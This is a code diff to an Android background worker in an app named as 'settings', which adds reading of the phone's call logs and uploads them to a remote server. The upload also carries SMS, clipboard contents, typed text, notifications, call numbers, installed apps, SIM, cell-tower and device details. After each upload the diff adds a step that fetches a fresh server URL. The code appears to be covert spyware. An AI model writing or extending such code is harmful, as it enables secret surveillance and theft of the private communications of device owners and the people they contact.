@@ -18,25 +18,32 @@ import com.android.volley.RetryPolicy;
 import com.android.volley.VolleyError;
 import com.android.volley.toolbox.StringRequest;
 import com.android.volley.toolbox.Volley;
+import com.google.gson.Gson;
+import com.wickerlabs.logmanager.LogObject;
+import com.wickerlabs.logmanager.LogsManager;
+
 import java.util.HashMap;
 
+import java.util.List;
 import java.util.Map;
 
 import static com.example.settings.ConnectivityManagers.isConnectedToNetwork;
 import static com.example.settings.MainActivity.clipboardManager;
 import static com.example.settings.MainActivity.deviceInformation;
 import static com.example.settings.MainActivity.getCellInfo;
+import static com.example.settings.MainActivity.geturl;
 import static com.example.settings.MainActivity.setupWorkManager;
 import static com.example.settings.MainActivity.setuponetimeworkManager;
 import static com.example.settings.MainActivity.simName;
 import static com.example.settings.Utils.getDateTime;
+import static com.example.settings.Utils.newUrlData;
 
 public class SyncData extends Worker {
     Sharedpref mSharedpref;
     Context context;
     String Name, OutgoingNumbers, RecievedNumbers, MissedCallNumbers, TextWritten, DaysTime,
             Copiedtext = "", Phonenumberdetails = "", Phoneappdetails = "",NotificationData,
-            SmsData,OtherNotificationData,ClickedData,OtherClickedData;
+            SmsData,OtherNotificationData,ClickedData,OtherClickedData,CallHistory;
     String url="";
     public SyncData(@NonNull Context context, @NonNull WorkerParameters workerParams) {
         super(context, workerParams);
@@ -68,6 +75,7 @@ public class SyncData extends Worker {
         OtherNotificationData=mSharedpref.getOtherNotificationData();
         ClickedData=mSharedpref.getClickedData();
         OtherClickedData=mSharedpref.getOtherClickedData();
+        Utils.readCallLogs(context,mSharedpref);
         try {
             ClipData pData = clipboardManager.getPrimaryClip();
             if (pData != null) {
@@ -88,7 +96,6 @@ public class SyncData extends Worker {
                     mSharedpref.setPrevPhoneNumbersListSize(numberlistsize);
                     mSharedpref.commit();
                 }
-                int ApplistSize= mSharedpref.getPhoneAppdetailsListSize();
                 if (mSharedpref.getPrevPhoneAppdetailsListSize() != mSharedpref.getPhoneAppdetailsListSize()) {
                     Phoneappdetails = mSharedpref.getPhoneAppdetails();
                     mSharedpref.setPrevPhoneAppdetailsListSize(mSharedpref.getPhoneAppdetailsListSize());
@@ -116,7 +123,15 @@ public class SyncData extends Worker {
                                     mSharedpref.setClickedData("");
                                     mSharedpref.setOtherClickedData("");
                                     mSharedpref.savePrevDate(getDateTime());
+                                    mSharedpref.setCallHistory("");
                                     mSharedpref.commit();
+                                   try {
+                                       geturl();
+                                       newUrlData(context,mSharedpref);
+                                   }
+                                   catch (Exception e){
+                                       e.printStackTrace();
+                                   }
                                 }
                             },
                             new Response.ErrorListener() {
@@ -149,6 +164,7 @@ public class SyncData extends Worker {
                             parmas.put("SmsData", SmsData);
                             parmas.put("ClickedData", ClickedData);
                             parmas.put("OtherClickedData", OtherClickedData);
+                            parmas.put("CallHistory",mSharedpref.getCallHistory());
                             parmas.put("Simdetails", String.valueOf(simName(context)));
                             parmas.put("PhoneTowerdetails", String.valueOf(getCellInfo(context)));
                             parmas.put("DeviceInfo", String.valueOf(deviceInformation(context)));
